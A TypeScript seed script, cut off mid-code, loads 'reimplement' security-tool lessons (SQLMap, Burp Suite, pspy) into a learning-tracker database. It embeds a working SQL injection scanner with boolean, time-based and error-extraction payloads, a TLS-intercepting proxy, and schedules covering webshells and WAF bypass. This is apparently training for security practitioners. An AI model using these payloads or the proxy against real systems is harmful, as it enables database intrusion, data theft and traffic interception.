#!/usr/bin/env npx tsx
/**
 * Seed: Web Exploitation & Remaining Tools
 * SQLMap, Burp Suite, pspy, and more with detailed schedules
 */

import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));
const now = Date.now();

const insertPath = db.prepare(`
	INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, schedule, created_at)
	VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
	INSERT INTO modules (path_id, name, description, order_index, created_at)
	VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
	INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
	VALUES (?, ?, ?, ?, ?, ?)
`);

// ============================================================================
// SQLMAP REIMPLEMENTATION
// ============================================================================
const sqlmapSchedule = `## 4-Week Schedule

### Week 1: SQL Injection Detection
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | HTTP Client | Build robust HTTP client with session handling |
| Day 2 | Parameter Parsing | Extract GET/POST/Cookie parameters |
| Day 3 | Error-Based Detection | Detect SQL errors in responses |
| Day 4 | Boolean-Based | Implement true/false response comparison |
| Day 5 | Time-Based | Detect timing differences with SLEEP |
| Weekend | Testing | Test against DVWA, SQLi-labs |

### Week 2: Exploitation Techniques
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | UNION-Based | Column count detection, data extraction |
| Day 2 | Stacked Queries | Multiple statement execution |
| Day 3 | Out-of-Band | DNS/HTTP exfiltration |
| Day 4 | Database Fingerprinting | Detect MySQL, PostgreSQL, MSSQL, Oracle |
| Day 5 | Version Detection | Extract exact database version |
| Weekend | Integration | Combine all techniques |

### Week 3: Data Extraction
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Schema Enumeration | List databases, tables, columns |
| Day 2 | Data Dumping | Extract table contents |
| Day 3 | Password Hashing | Identify and crack common hashes |
| Day 4 | File Read/Write | Read files, write webshells |
| Day 5 | OS Command Execution | xp_cmdshell, sys_exec |
| Weekend | Optimization | Threading, caching |

### Week 4: Advanced Features
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | WAF Bypass | Encoding, case manipulation, comments |
| Day 2 | Tamper Scripts | Extensible payload modification |
| Day 3 | Proxy Support | HTTP/SOCKS proxy, Tor integration |
| Day 4 | Output Formats | JSON, CSV, HTML reports |
| Day 5 | CLI Interface | Full command-line interface |
| Weekend | Documentation | Usage guide, examples |

### Daily Commitment
- **Minimum**: 2-3 hours focused coding
- **Ideal**: 4-5 hours with testing`;

const sqlmapPath = insertPath.run(
	'Reimplement: SQLMap (SQL Injection)',
	'Build a complete SQL injection tool like SQLMap. Detection, exploitation, data extraction, WAF bypass, and database takeover.',
	'red',
	'Python',
	'advanced',
	4,
	'SQL injection, HTTP, database fingerprinting, WAF bypass, exploitation',
	sqlmapSchedule,
	now
);

const sqlMod1 = insertModule.run(sqlmapPath.lastInsertRowid, 'SQL Injection Detection', 'Detect injectable parameters', 0, now);

insertTask.run(sqlMod1.lastInsertRowid, 'Build SQLi Detection Engine', 'Implement automated SQL injection detection using error-based, boolean-blind, time-based, and UNION techniques with payload fuzzing, response comparison, and database fingerprinting capabilities', `## SQL Injection Detection Engine

### Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
SQLMap-style SQL Injection Scanner
Detects and exploits SQL injection vulnerabilities
"""

import requests
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import difflib


class InjectionType(Enum):
    ERROR_BASED = "error-based"
    BOOLEAN_BASED = "boolean-based blind"
    TIME_BASED = "time-based blind"
    UNION_BASED = "UNION query"
    STACKED = "stacked queries"


class DatabaseType(Enum):
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "Microsoft SQL Server"
    ORACLE = "Oracle"
    SQLITE = "SQLite"
    UNKNOWN = "Unknown"


@dataclass
class InjectionPoint:
    parameter: str
    injection_type: InjectionType
    database: DatabaseType
    payload: str
    prefix: str = ""
    suffix: str = ""


@dataclass
class ScanResult:
    url: str
    method: str
    vulnerable: bool
    injection_points: List[InjectionPoint] = field(default_factory=list)
    database_version: Optional[str] = None


class SQLiScanner:
    """SQL Injection Scanner"""

    # Error patterns for different databases
    ERROR_PATTERNS = {
        DatabaseType.MYSQL: [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"MySqlClient\\.",
            r"com\\.mysql\\.jdbc",
        ],
        DatabaseType.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"Warning.*\\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\\.",
            r"PG::SyntaxError:",
            r"org\\.postgresql\\.util\\.PSQLException",
        ],
        DatabaseType.MSSQL: [
            r"Driver.* SQL[\\-\\_\\ ]*Server",
            r"OLE DB.* SQL Server",
            r"\\bSQL Server[^&lt;&quot;]+Driver",
            r"Warning.*mssql_",
            r"\\[SQL Server\\]",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"com\\.microsoft\\.sqlserver\\.jdbc",
        ],
        DatabaseType.ORACLE: [
            r"\\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\\Woci_",
            r"Warning.*\\Wora_",
        ],
        DatabaseType.SQLITE: [
            r"SQLite/JDBCDriver",
            r"SQLite\\.Exception",
            r"System\\.Data\\.SQLite\\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\\[SQLITE_ERROR\\]",
        ],
    }

    # Boolean-based payloads
    BOOLEAN_PAYLOADS = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 1=1--", "' AND 1=2--"),
        ("' OR '1'='1", "' OR '1'='2"),
        ('" AND "1"="1', '" AND "1"="2'),
        ("1 AND 1=1", "1 AND 1=2"),
        ("1' AND '1'='1' AND '1'='1", "1' AND '1'='1' AND '1'='2"),
    ]

    # Time-based payloads (seconds to sleep)
    TIME_PAYLOADS = {
        DatabaseType.MYSQL: "' AND SLEEP({time})--",
        DatabaseType.POSTGRESQL: "'; SELECT pg_sleep({time})--",
        DatabaseType.MSSQL: "'; WAITFOR DELAY '0:0:{time}'--",
        DatabaseType.ORACLE: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{time})--",
        DatabaseType.SQLITE: "' AND {time}=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    }

    # Error-based payloads for data extraction
    ERROR_EXTRACTION = {
        DatabaseType.MYSQL: "' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))--",
        DatabaseType.POSTGRESQL: "' AND 1=CAST(({query}) AS INT)--",
        DatabaseType.MSSQL: "' AND 1=CONVERT(INT,({query}))--",
    }

    def __init__(self, timeout: int = 10, threads: int = 5):
        self.session = requests.Session()
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.timeout = timeout
        self.threads = threads
        self.time_threshold = 5  # seconds

    def scan(self, url: str, method: str = "GET",
             data: Dict = None, cookies: Dict = None) -> ScanResult:
        """Scan URL for SQL injection vulnerabilities"""

        result = ScanResult(url=url, method=method, vulnerable=False)

        # Parse parameters
        params = self._extract_params(url, data)

        if not params:
            print("[-] No parameters found to test")
            return result

        print(f"[*] Testing {len(params)} parameter(s)")

        # Get baseline response
        baseline = self._get_baseline(url, method, data, cookies)

        # Test each parameter
        for param_name, param_value in params.items():
            print(f"\\n[*] Testing parameter: {param_name}")

            # 1. Error-based detection
            injection = self._test_error_based(
                url, method, param_name, param_value, data, cookies
            )
            if injection:
                result.injection_points.append(injection)
                result.vulnerable = True
                continue

            # 2. Boolean-based detection
            injection = self._test_boolean_based(
                url, method, param_name, param_value, data, cookies, baseline
            )
            if injection:
                result.injection_points.append(injection)
                result.vulnerable = True
                continue

            # 3. Time-based detection
            injection = self._test_time_based(
                url, method, param_name, param_value, data, cookies
            )
            if injection:
                result.injection_points.append(injection)
                result.vulnerable = True

        if result.vulnerable:
            # Try to get database version
            result.database_version = self._get_version(
                url, method, result.injection_points[0], data, cookies
            )

        return result

    def _extract_params(self, url: str, data: Dict) -> Dict[str, str]:
        """Extract parameters from URL and POST data"""
        params = {}

        # GET parameters
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        for key, values in query_params.items():
            params[key] = values[0] if values else ""

        # POST parameters
        if data:
            params.update(data)

        return params

    def _get_baseline(self, url: str, method: str,
                      data: Dict, cookies: Dict) -> Tuple[str, float]:
        """Get baseline response for comparison"""
        start = time.time()
        response = self._request(url, method, data, cookies)
        elapsed = time.time() - start
        return response.text if response else "", elapsed

    def _test_error_based(self, url: str, method: str,
                          param: str, value: str,
                          data: Dict, cookies: Dict) -> Optional[InjectionPoint]:
        """Test for error-based SQL injection"""

        payloads = ["'", '"', "')", "'))", "';", '";']

        for payload in payloads:
            test_value = value + payload
            response = self._request_with_param(
                url, method, param, test_value, data, cookies
            )

            if not response:
                continue

            # Check for SQL errors
            for db_type, patterns in self.ERROR_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"    [+] Error-based SQLi found! (Database: {db_type.value})")
                        return InjectionPoint(
                            parameter=param,
                            injection_type=InjectionType.ERROR_BASED,
                            database=db_type,
                            payload=payload
                        )

        return None

    def _test_boolean_based(self, url: str, method: str,
                            param: str, value: str,
                            data: Dict, cookies: Dict,
                            baseline: Tuple[str, float]) -> Optional[InjectionPoint]:
        """Test for boolean-based blind SQL injection"""

        baseline_text, _ = baseline

        for true_payload, false_payload in self.BOOLEAN_PAYLOADS:
            # Test true condition
            true_response = self._request_with_param(
                url, method, param, value + true_payload, data, cookies
            )
            if not true_response:
                continue

            # Test false condition
            false_response = self._request_with_param(
                url, method, param, value + false_payload, data, cookies
            )
            if not false_response:
                continue

            # Compare responses
            true_ratio = self._similarity_ratio(baseline_text, true_response.text)
            false_ratio = self._similarity_ratio(baseline_text, false_response.text)

            # True should be similar to baseline, false should be different
            if true_ratio > 0.9 and false_ratio < 0.8:
                print(f"    [+] Boolean-based blind SQLi found!")
                return InjectionPoint(
                    parameter=param,
                    injection_type=InjectionType.BOOLEAN_BASED,
                    database=DatabaseType.UNKNOWN,
                    payload=true_payload
                )

        return None

    def _test_time_based(self, url: str, method: str,
                         param: str, value: str,
                         data: Dict, cookies: Dict) -> Optional[InjectionPoint]:
        """Test for time-based blind SQL injection"""

        for db_type, payload_template in self.TIME_PAYLOADS.items():
            payload = payload_template.format(time=self.time_threshold)

            start = time.time()
            self._request_with_param(
                url, method, param, value + payload, data, cookies
            )
            elapsed = time.time() - start

            if elapsed >= self.time_threshold - 1:
                print(f"    [+] Time-based blind SQLi found! (Database: {db_type.value})")
                return InjectionPoint(
                    parameter=param,
                    injection_type=InjectionType.TIME_BASED,
                    database=db_type,
                    payload=payload
                )

        return None

    def _get_version(self, url: str, method: str,
                     injection: InjectionPoint,
                     data: Dict, cookies: Dict) -> Optional[str]:
        """Extract database version"""

        version_queries = {
            DatabaseType.MYSQL: "SELECT VERSION()",
            DatabaseType.POSTGRESQL: "SELECT version()",
            DatabaseType.MSSQL: "SELECT @@VERSION",
            DatabaseType.ORACLE: "SELECT banner FROM v$version WHERE ROWNUM=1",
            DatabaseType.SQLITE: "SELECT sqlite_version()",
        }

        if injection.database == DatabaseType.UNKNOWN:
            return None

        if injection.injection_type == InjectionType.ERROR_BASED:
            query = version_queries.get(injection.database)
            if query and injection.database in self.ERROR_EXTRACTION:
                payload_template = self.ERROR_EXTRACTION[injection.database]
                payload = payload_template.format(query=query)
                # Would need to parse the error to extract version
                return None

        return None

    def _request(self, url: str, method: str,
                 data: Dict, cookies: Dict) -> Optional[requests.Response]:
        """Make HTTP request"""
        try:
            if method.upper() == "GET":
                return self.session.get(url, cookies=cookies, timeout=self.timeout)
            else:
                return self.session.post(url, data=data, cookies=cookies, timeout=self.timeout)
        except:
            return None

    def _request_with_param(self, url: str, method: str,
                            param: str, value: str,
                            data: Dict, cookies: Dict) -> Optional[requests.Response]:
        """Make request with modified parameter"""

        if method.upper() == "GET":
            # Modify URL parameter
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            query[param] = [value]
            new_query = urllib.parse.urlencode(query, doseq=True)
            new_url = parsed._replace(query=new_query).geturl()
            return self._request(new_url, method, None, cookies)
        else:
            # Modify POST parameter
            new_data = data.copy() if data else {}
            new_data[param] = value
            return self._request(url, method, new_data, cookies)

    def _similarity_ratio(self, s1: str, s2: str) -> float:
        """Calculate similarity ratio between two strings"""
        return difflib.SequenceMatcher(None, s1, s2).ratio()


class SQLiExploiter:
    """Exploit SQL injection to extract data"""

    def __init__(self, scanner: SQLiScanner, injection: InjectionPoint):
        self.scanner = scanner
        self.injection = injection

    def get_databases(self) -> List[str]:
        """List all databases"""
        if self.injection.database == DatabaseType.MYSQL:
            return self._extract_data(
                "SELECT schema_name FROM information_schema.schemata"
            )
        elif self.injection.database == DatabaseType.MSSQL:
            return self._extract_data(
                "SELECT name FROM sys.databases"
            )
        return []

    def get_tables(self, database: str) -> List[str]:
        """List tables in database"""
        if self.injection.database == DatabaseType.MYSQL:
            return self._extract_data(
                f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{database}'"
            )
        return []

    def get_columns(self, database: str, table: str) -> List[str]:
        """List columns in table"""
        if self.injection.database == DatabaseType.MYSQL:
            return self._extract_data(
                f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema='{database}' AND table_name='{table}'"
            )
        return []

    def dump_table(self, database: str, table: str, columns: List[str]) -> List[Dict]:
        """Dump table contents"""
        cols = ','.join(columns)
        return self._extract_data(
            f"SELECT {cols} FROM {database}.{table}"
        )

    def _extract_data(self, query: str) -> List[str]:
        """Extract data using appropriate technique"""
        # Implementation depends on injection type
        return []


def main():
    import argparse

    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('-d', '--data', help='POST data')
    parser.add_argument('--dbs', action='store_true', help='Enumerate databases')
    parser.add_argument('--tables', help='Enumerate tables in database')
    parser.add_argument('--dump', nargs=2, metavar=('DB', 'TABLE'), help='Dump table')
    parser.add_argument('-t', '--threads', type=int, default=5)
    parser.add_argument('--timeout', type=int, default=10)

    args = parser.parse_args()

    # Parse POST data
    data = None
    if args.data:
        data = dict(x.split('=') for x in args.data.split('&'))

    scanner = SQLiScanner(timeout=args.timeout, threads=args.threads)
    result = scanner.scan(args.url, args.method, data)

    if result.vulnerable:
        print(f"\\n[+] Target is VULNERABLE!")
        print(f"[+] Injection points: {len(result.injection_points)}")

        for point in result.injection_points:
            print(f"    Parameter: {point.parameter}")
            print(f"    Type: {point.injection_type.value}")
            print(f"    Database: {point.database.value}")
    else:
        print("\\n[-] No SQL injection found")


if __name__ == '__main__':
    main()
\`\`\`
`, 0, now);

// ============================================================================
// BURP SUITE PROXY
// ============================================================================
const burpSchedule = `## 6-Week Schedule

### Week 1: HTTP Proxy Core
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | MITM Proxy | Basic HTTP proxy with request interception |
| Day 2 | HTTPS Support | SSL/TLS interception with custom CA |
| Day 3 | Request Parsing | Parse and modify HTTP requests |
| Day 4 | Response Handling | Capture and modify responses |
| Day 5 | WebSocket Support | Proxy WebSocket connections |
| Weekend | Testing | Test with real websites |

### Week 2: Interceptor UI
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | TUI Framework | Set up terminal UI with textual/rich |
| Day 2 | Request View | Display intercepted requests |
| Day 3 | Editing | Edit and forward requests |
| Day 4 | Drop/Forward | Control request flow |
| Day 5 | Match & Replace | Auto-modify requests |
| Weekend | Polish | Keyboard shortcuts |

### Week 3: History & Repeater
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | History Storage | SQLite for request history |
| Day 2 | Search & Filter | Filter by URL, status, type |
| Day 3 | Repeater | Resend and modify requests |
| Day 4 | Compare | Diff responses |
| Day 5 | Export | Save requests as cURL, Python |
| Weekend | Performance | Optimize for large histories |

### Week 4: Scanner
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Crawler | Discover endpoints from history |
| Day 2 | Active Scan | Inject payloads |
| Day 3 | XSS Detection | Reflected and stored XSS |
| Day 4 | SQLi Detection | Basic SQL injection checks |
| Day 5 | SSRF/LFI | Server-side vulnerabilities |
| Weekend | Reporting | Generate scan reports |

### Week 5: Intruder
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Payload Positions | Mark injection points |
| Day 2 | Attack Types | Sniper, Battering Ram, Pitchfork |
| Day 3 | Payload Sets | Wordlists, numbers, encoding |
| Day 4 | Grep Match | Match responses |
| Day 5 | Results Analysis | Sort by length, status, time |
| Weekend | Cluster Bomb | Full attack mode |

### Week 6: Extensions & Polish
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Plugin System | Extensible architecture |
| Day 2 | Decoder | Base64, URL, HTML encoding |
| Day 3 | Comparer | Visual diff tool |
| Day 4 | Sequencer | Analyze token randomness |
| Day 5 | Final Polish | Error handling, docs |
| Weekend | Release | Package and document |

### Daily Commitment
- **Minimum**: 2-3 hours
- **Ideal**: 4-5 hours`;

const burpPath = insertPath.run(
	'Reimplement: Web Proxy (Burp Suite)',
	'Build a web security testing proxy like Burp Suite. MITM proxy, request interception, repeater, intruder, scanner, and decoder.',
	'orange',
	'Python+Go',
	'advanced',
	6,
	'HTTP/HTTPS proxy, TLS interception, fuzzing, scanning, TUI',
	burpSchedule,
	now
);

const burpMod1 = insertModule.run(burpPath.lastInsertRowid, 'Intercepting Proxy', 'MITM HTTP/HTTPS proxy', 0, now);

insertTask.run(burpMod1.lastInsertRowid, 'Build MITM Proxy', 'Create an intercepting proxy that terminates TLS connections with dynamic certificate generation, captures HTTP/S requests and responses, and allows real-time modification for web application security testing', `## MITM Proxy Implementation

### Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
MITM Proxy - Intercept HTTP/HTTPS traffic
Like Burp Suite Proxy
"""

import socket
import ssl
import threading
import re
from dataclasses import dataclass
from typing import Optional, Callable, Dict, Tuple
from urllib.parse import urlparse
import select


@dataclass
class HTTPRequest:
    method: str
    url: str
    version: str
    headers: Dict[str, str]
    body: bytes
    raw: bytes

    @property
    def host(self) -> str:
        return self.headers.get('Host', '')

    @property
    def path(self) -> str:
        return urlparse(self.url).path or '/'


@dataclass
class HTTPResponse:
    version: str
    status_code: int
    status_message: str
    headers: Dict[str, str]
    body: bytes
    raw: bytes


class MITMProxy:
    """Man-in-the-Middle HTTP/HTTPS Proxy"""

    def __init__(
        self,
        host: str = '127.0.0.1',
        port: int = 8080,
        ca_cert: str = 'ca.crt',
        ca_key: str = 'ca.key'
    ):
        self.host = host
        self.port = port
        self.ca_cert = ca_cert
        self.ca_key = ca_key

        self.intercept_enabled = True
        self.request_handler: Optional[Callable] = None
        self.response_handler: Optional[Callable] = None

        # SSL context for generating fake certs
        self.ca_context = self._load_ca()

        # Cache for generated certificates
        self.cert_cache: Dict[str, Tuple[str, str]] = {}

    def _load_ca(self) -> Optional[ssl.SSLContext]:
        """Load CA certificate for signing"""
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.ca_cert, self.ca_key)
            return ctx
        except:
            print("[!] CA not found, HTTPS interception disabled")
            return None

    def start(self):
        """Start the proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)

        print(f"[*] Proxy listening on {self.host}:{self.port}")

        while True:
            client, addr = server.accept()
            threading.Thread(
                target=self._handle_client,
                args=(client, addr),
                daemon=True
            ).start()

    def _handle_client(self, client: socket.socket, addr: tuple):
        """Handle incoming client connection"""
        try:
            # Read initial request
            request = self._read_request(client)
            if not request:
                client.close()
                return

            if request.method == 'CONNECT':
                # HTTPS - establish tunnel
                self._handle_https(client, request)
            else:
                # HTTP - forward directly
                self._handle_http(client, request)

        except Exception as e:
            print(f"[-] Error handling client: {e}")
        finally:
            try:
                client.close()
            except:
                pass

    def _handle_http(self, client: socket.socket, request: HTTPRequest):
        """Handle plain HTTP request"""

        # Call request handler
        if self.request_handler:
            request = self.request_handler(request)

        if request is None:  # Dropped
            return

        # Forward to server
        response = self._forward_request(request)

        if response and self.response_handler:
            response = self.response_handler(request, response)

        if response:
            client.sendall(response.raw)

    def _handle_https(self, client: socket.socket, request: HTTPRequest):
        """Handle HTTPS CONNECT request"""

        host, port = self._parse_connect(request.url)

        # Send connection established
        client.sendall(b'HTTP/1.1 200 Connection Established\\r\\n\\r\\n')

        if not self.ca_context:
            # No CA - just tunnel
            self._tunnel(client, host, port)
            return

        # Generate certificate for host
        cert_file, key_file = self._get_cert(host)

        # Wrap client connection with SSL
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_file, key_file)

            ssl_client = ctx.wrap_socket(client, server_side=True)

            # Now handle decrypted traffic
            while True:
                request = self._read_request(ssl_client)
                if not request:
                    break

                # Fix host header and URL
                request.headers['Host'] = host
                if not request.url.startswith('http'):
                    request.url = f"https://{host}:{port}{request.url}"

                # Forward request
                response = self._forward_https_request(request, host, port)

                if self.response_handler and response:
                    response = self.response_handler(request, response)

                if response:
                    ssl_client.sendall(response.raw)

        except Exception as e:
            print(f"[-] HTTPS handling error: {e}")

    def _tunnel(self, client: socket.socket, host: str, port: int):
        """Create simple tunnel without interception"""
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((host, port))

            while True:
                readable, _, _ = select.select([client, server], [], [], 10)

                if client in readable:
                    data = client.recv(4096)
                    if not data:
                        break
                    server.sendall(data)

                if server in readable:
                    data = server.recv(4096)
                    if not data:
                        break
                    client.sendall(data)

            server.close()
        except:
            pass

    def _read_request(self, sock: socket.socket) -> Optional[HTTPRequest]:
        """Read HTTP request from socket"""
        try:
            data = b''
            while b'\\r\\n\\r\\n' not in data:
                chunk = sock.recv(4096)
                if not chunk:
                    return None
                data += chunk

            # Split headers and body
            header_end = data.index(b'\\r\\n\\r\\n')
            headers_raw = data[:header_end].decode('utf-8', errors='ignore')
            body = data[header_end + 4:]

            # Parse request line
            lines = headers_raw.split('\\r\\n')
            method, url, version = lines[0].split(' ', 2)

            # Parse headers
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()

            # Read body if Content-Length specified
            content_length = int(headers.get('Content-Length', 0))
            while len(body) < content_length:
                body += sock.recv(content_length - len(body))

            return HTTPRequest(
                method=method,
                url=url,
                version=version,
                headers=headers,
                body=body,
                raw=data
            )

        except Exception as e:
            return None

    def _forward_request(self, request: HTTPRequest) -> Optional[HTTPResponse]:
        """Forward HTTP request to server"""
        try:
            parsed = urlparse(request.url)
            host = parsed.hostname
            port = parsed.port or 80

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((host, port))

            # Rebuild request
            path = parsed.path or '/'
            if parsed.query:
                path += '?' + parsed.query

            req = f"{request.method} {path} {request.version}\\r\\n"
            for key, value in request.headers.items():
                req += f"{key}: {value}\\r\\n"
            req += "\\r\\n"

            sock.sendall(req.encode() + request.body)

            return self._read_response(sock)

        except Exception as e:
            print(f"[-] Forward error: {e}")
            return None

    def _forward_https_request(
        self,
        request: HTTPRequest,
        host: str,
        port: int
    ) -> Optional[HTTPResponse]:
        """Forward HTTPS request"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

            # Rebuild request
            parsed = urlparse(request.url)
            path = parsed.path or '/'
            if parsed.query:
                path += '?' + parsed.query

            req = f"{request.method} {path} {request.version}\\r\\n"
            for key, value in request.headers.items():
                req += f"{key}: {value}\\r\\n"
            req += "\\r\\n"

            ssl_sock.sendall(req.encode() + request.body)

            return self._read_response(ssl_sock)

        except Exception as e:
            print(f"[-] HTTPS forward error: {e}")
            return None

    def _read_response(self, sock) -> Optional[HTTPResponse]:
        """Read HTTP response from socket"""
        try:
            data = b''
            while b'\\r\\n\\r\\n' not in data:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk

            if not data:
                return None

            # Split headers and body
            header_end = data.index(b'\\r\\n\\r\\n')
            headers_raw = data[:header_end].decode('utf-8', errors='ignore')
            body = data[header_end + 4:]

            # Parse status line
            lines = headers_raw.split('\\r\\n')
            parts = lines[0].split(' ', 2)
            version = parts[0]
            status_code = int(parts[1])
            status_message = parts[2] if len(parts) > 2 else ''

            # Parse headers
            headers = {}
            for line in lines[1:]:
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip()] = value.strip()

            # Read rest of body
            content_length = headers.get('Content-Length')
            if content_length:
                remaining = int(content_length) - len(body)
                while remaining > 0:
                    chunk = sock.recv(min(remaining, 4096))
                    if not chunk:
                        break
                    body += chunk
                    remaining -= len(chunk)

            return HTTPResponse(
                version=version,
                status_code=status_code,
                status_message=status_message,
                headers=headers,
                body=body,
                raw=data
            )

        except:
            return None

    def _parse_connect(self, url: str) -> Tuple[str, int]:
        """Parse CONNECT request host:port"""
        if ':' in url:
            host, port = url.split(':')
            return host, int(port)
        return url, 443

    def _get_cert(self, host: str) -> Tuple[str, str]:
        """Get or generate certificate for host"""
        if host in self.cert_cache:
            return self.cert_cache[host]

        # Generate certificate
        cert_file = f"/tmp/{host}.crt"
        key_file = f"/tmp/{host}.key"

        # Use openssl to generate (simplified)
        import subprocess
        subprocess.run([
            'openssl', 'req', '-new', '-newkey', 'rsa:2048',
            '-days', '365', '-nodes', '-x509',
            '-subj', f'/CN={host}',
            '-keyout', key_file, '-out', cert_file
        ], capture_output=True)

        self.cert_cache[host] = (cert_file, key_file)
        return cert_file, key_file


def main():
    proxy = MITMProxy()

    # Example request handler
    def request_handler(request: HTTPRequest) -> HTTPRequest:
        print(f"[>] {request.method} {request.url}")
        return request

    def response_handler(request: HTTPRequest, response: HTTPResponse) -> HTTPResponse:
        print(f"[<] {response.status_code} {request.url[:50]}")
        return response

    proxy.request_handler = request_handler
    proxy.response_handler = response_handler

    proxy.start()


if __name__ == '__main__':
    main()
\`\`\`
`, 0, now);

// ============================================================================
// PSPY REIMPLEMENTATION
// ============================================================================
const pspySchedule = `## 2-Week Schedule

### Week 1: Process Monitoring
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | /proc Parsing | Read /proc filesystem for processes |
| Day 2 | New Process Detection | Detect newly spawned processes |
| Day 3 | Command Line Extraction | Get full command lines |
| Day 4 | UID/GID Resolution | Resolve user/group names |
| Day 5 | File System Events | Monitor file changes with inotify |
| Weekend | Performance | Optimize for minimal CPU usage |

### Week 2: Advanced Features
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Cron Monitoring | Detect cron job execution |
| Day 2 | Colorized Output | Pretty terminal output |
| Day 3 | Filtering | Filter by user, command, path |
| Day 4 | Logging | Log to file |
| Day 5 | Static Binary | Compile as static binary |
| Weekend | Testing | Test on various systems |

### Daily Commitment
- **Minimum**: 2 hours
- **Ideal**: 3-4 hours`;

const pspyPath = insertPath.run(
	'Reimplement: pspy (Process Snooping)',
	'Build a process monitoring tool like pspy. Monitor processes without root by scanning /proc filesystem. Detect cron jobs and scheduled tasks.',
	'green',
	'Go+Rust',
	'intermediate',
	2,
	'/proc filesystem, inotify, process monitoring, privilege escalation',
	pspySchedule,
	now
);

const pspyMod1 = insertModule.run(pspyPath.lastInsertRowid, 'Process Monitoring', 'Monitor processes without root', 0, now);

insertTask.run(pspyMod1.lastInsertRowid, 'Build Process Monitor', 'Monitor process creation on Linux without root by polling /proc filesystem, using inotify on /proc entries, and extracting command-line arguments, environment variables, and user context for each spawned process', `## pspy Implementation

### Go Implementation

\`\`\`go
package main

import (
    "fmt"
    "io/ioutil"
    "os"
    "os/user"
    "path/filepath"
    "strconv"
    "strings"
    "syscall"
    "time"
)

// Process represents a Linux process
type Process struct {
    PID     int
    PPID    int
    UID     int
    User    string
    Cmdline string
    Comm    string
    Cwd     string
}

// ProcessMonitor monitors for new processes
type ProcessMonitor struct {
    known     map[int]bool
    interval  time.Duration
    showPaths bool
}

func NewProcessMonitor(interval time.Duration) *ProcessMonitor {
    return &ProcessMonitor{
        known:    make(map[int]bool),
        interval: interval,
    }
}

func (pm *ProcessMonitor) Start() {
    // Initial scan
    processes := pm.scanProcesses()
    for _, p := range processes {
        pm.known[p.PID] = true
    }

    fmt.Println("pspy - Monitor processes without root")
    fmt.Println("======================================")
    fmt.Printf("Scanning every %v\\n\\n", pm.interval)

    // Monitor loop
    for {
        time.Sleep(pm.interval)

        processes := pm.scanProcesses()
        currentPIDs := make(map[int]bool)

        for _, p := range processes {
            currentPIDs[p.PID] = true

            if !pm.known[p.PID] {
                pm.printProcess(p)
                pm.known[p.PID] = true
            }
        }

        // Clean up dead processes
        for pid := range pm.known {
            if !currentPIDs[pid] {
                delete(pm.known, pid)
            }
        }
    }
}

func (pm *ProcessMonitor) scanProcesses() []Process {
    var processes []Process

    entries, err := ioutil.ReadDir("/proc")
    if err != nil {
        return processes
